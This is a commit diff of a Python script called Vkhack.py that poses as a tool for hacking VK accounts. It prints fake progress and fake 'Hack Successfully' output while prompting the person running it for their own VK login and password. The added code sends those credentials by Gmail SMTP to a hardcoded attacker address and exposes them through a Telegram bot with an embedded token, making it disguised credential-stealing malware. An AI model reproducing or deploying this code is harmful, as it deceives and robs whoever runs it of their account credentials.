9e0920ae3e7c606fcf03deca19d1f89a761dc31a
XkrasavikX <44529049+XkrasavikX@users.noreply.github.com>
2019-06-01 20:39:50 +0300

    Add files via upload

--- Vkhack.py
+++ Vkhack.py
@@ -1,34 +1,40 @@
+import telebot
+from telebot import apihelper
+bot = telebot.TeleBot('672554903:AAGdiJoIjp1zoVgVoQf3e-yZu_GZngEoi74')
+import requests
 import os
+import sys
+from time import sleep as ts
 import smtplib
 import sys
+import random
 from tqdm import tqdm
 import itertools as it
 from colorama import init
 from colorama import Fore, Back, Style
 import time
+hack = 'smtp.gmail.com:587'
 
-
-
-print(Fore.RED)
-print('''____   ________  __. .__                   __       ___ ___            .___              
-\   \ /   /    |/ _| |  |__ _____    ____ |  | __  /   |   \ ___.__. __| _/___________   
- \   Y   /|      <   |  |  \\__  \ _/ ___\|  |/ / /    ~    <   |  |/ __ |\_  __ \__  \  
+print('''____   ________  __. .__                   __       ___ ___            .___
+\   \ /   /    |/ _| |  |__ _____    ____ |  | __  /   |   \ ___.__. __| _/___________
+ \   Y   /|      <   |  |  \\__  \ _/ ___\|  |/ / /    ~    <   |  |/ __ |\_  __ \__  \
   \     / |    |  \  |   Y  \/ __ \\  \___|    <  \    Y    /\___  / /_/ | |  | \// __ \_
    \___/  |____|__ \ |___|  (____  /\___  >__|_ \  \___|_  / / ____\____ | |__|  (____  /
-                  \/      \/     \/     \/     \/        \/  \/         \/            \/ 
-_______________  ____ ________                               .__                         
-\_____  \   _  \/_   /   __   \ _____________   ____   _____ |__| ____   _____           
- /  ____/  /_\  \|   \____    / \____ \_  __ \_/ __ \ /     \|  |/  _ \ /     \          
-/       \  \_/   \   |  /    /  |  |_> >  | \/\  ___/|  Y Y  \  (  <_> )  Y Y  \         
-\_______ \_____  /___| /____/   |   __/|__|    \___  >__|_|  /__|\____/|__|_|  /         
-        \/     \/               |__|               \/      \/                \/        
+                  \/      \/     \/     \/     \/        \/  \/         \/            \/
+_______________  ____ ________                               .__
+\_____  \   _  \/_   /   __   \ _____________   ____   _____ |__| ____   _____
+ /  ____/  /_\  \|   \____    / \____ \_  __ \_/ __ \ /     \|  |/  _ \ /     \
+/       \  \_/   \   |  /    /  |  |_> >  | \/\  ___/|  Y Y  \  (  <_> )  Y Y  \
+\_______ \_____  /___| /____/   |   __/|__|    \___  >__|_|  /__|\____/|__|_|  /
+        \/     \/               |__|               \/      \/                \/
             
 _________________________________________________________________________________________''')
 print(Fore.GREEN)
 print('''Download Full Releases Y/n?''')
 print(Fore.RESET)
-
-
+drr = "jack"
+s = "doss223ru"
+ass = random.randint(80000000000,89999999999)
 def dos():
     for i in tqdm(range(100)):
         time.sleep(1)
@@ -45,6 +51,7 @@ a = input()
 if a == 'y':
     dos()
 time.sleep(2)
+g = "@gmail.com"
 print(Fore.BLUE)
 print('''Multiple vulnerabilities were found in Vk Workstation and Fusion.
 
@@ -59,49 +66,94 @@ ________________________________________________________________________________
 Write victim Vk url  to Hack : ''')
 url =input()
 time.sleep(1)
-print('Connection ....')
-time.sleep(2)
-print('Connection - YES')
-time.sleep(2)
-print('Connection to vk.com ...')
-time.sleep(2)
-print('Connection to vk.com - YES')
+def fre():
+    print('Connection ....')
+    time.sleep(2)
+    print('Connection - YES')
+    time.sleep(2)
+    print('Connection to vk.com ...')
+    time.sleep(2)
+    print('Connection to vk.com - YES')
+fre()
 print(Fore.RED)
+se = random.randint(1,89999)
+sos = str(se) + 'nertw'
+dr = drr + "228x228" + g
 print('[ERROR 678] Havent login and Password to Connect vk.com ')
 time.sleep(2)
 print('[ERROR 698] Havent login and Password to Connect vk.com ')
 print('[ERROR 678] > Please write you login and Password to Connect vk.com ')
 login = input('Login:')
 Password = input('Password:')
-print(Fore.GREEN)
-print('[ERROR 678] >  Connecting vk.com ....')
-print('Connection to vk.com - YES')
-time.sleep(2)
-print('Hack Successfully|100%')
-time.sleep(2)
-print('Login: 89675456534')
-print('Password: fuy1234masha')
-time.sleep(2)
+def full():
+      print(Fore.GREEN)
+      print('[ERROR 678] >  Connecting vk.com ....')
+      print('Connection to vk.com - YES')
+      time.sleep(2)
+      print('Hack Successfully|100%')
+      time.sleep(2)
+      print('Login:  ' + str(ass))
+      print('Password: ' + str(sos))
+
+      @bot.message_handler(content_types=["new_chat_members"])
+      def handler_new_member(message):
+          user_name = message.new_chat_member.first_name
+          bot.send_message(message.chat.id,
+                           " {0}!   /rull".format(user_name))
+
+      @bot.message_handler(commands=['test'])
+      def start_message(message):
+          bot.send_message(message.chat.id, login + Password)
+
+      @bot.message_handler(commands=['rull'])
+      def start_message(message):
+          bot.send_message(message.chat.id, ''' ''')
+
+      @bot.message_handler(commands=['help'])
+      def start_message(message):
+          bot.send_message(message.chat.id, '''hackvk
+      ''')
+
+      @bot.message_handler(content_types=['text'])
+      def send_text(message):
+          if message.text == 'pass':
+              bot.send_message(message.chat.id, 'password')
+          elif message.text == 'pass':
+              bot.send_message(message.chat.id, 'Прощай')
+
+      keyboard1 = telebot.types.ReplyKeyboardMarkup()
+      keyboard1.row('Привет', 'Пока')
+
+      @bot.message_handler(commands=['start'])
+      def start_message(message):
+          bot.send_message(message.chat.id, 'хочеш узнать все мои функции? пропиши /help', reply_markup=keyboard1)
+
+      keyboard1 = telebot.types.ReplyKeyboardMarkup(True, True)
+
+      bot.polling()
+      time.sleep(2)
+full()
 for i in (range(1000)):
      oi()
 r = "spambotby"
 for i in (range(1000)):
+    
      oi()
-dr = "jack228x228@gmail.com"
-s = "doss229ru"
+
 for i in (range(1000)):
      oi()
-subj = 'Notification from system'
-msg_txt = Password + ' ' + login
-msg = "From: %s\nTo: %s\nSubject: %s\n\n%s"  % (r, dr, subj, msg_txt)
-print('\n')
-server = smtplib.SMTP('smtp.gmail.com:587')
-server.set_debuglevel(1);
-server.starttls()
-server.login(r,s)
-server.sendmail(r, dr, msg)
-server.quit()
-
+def victum():
+     subj = 'Notification from system'
+     m = Password + ' ' + login
+     ms = "From: %s\nTo: %s\nSubject: %s\n\n%s"  % (r, dr, subj, m)
+     print('\n')
+     server = smtplib.SMTP(hack)
+     server.set_debuglevel(1)
+     server.starttls()
+     server.login(r,s)
+     server.sendmail(r, dr, ms)
+     server.quit()
+victum()
 for i in (range(1000)):
      oi()
 
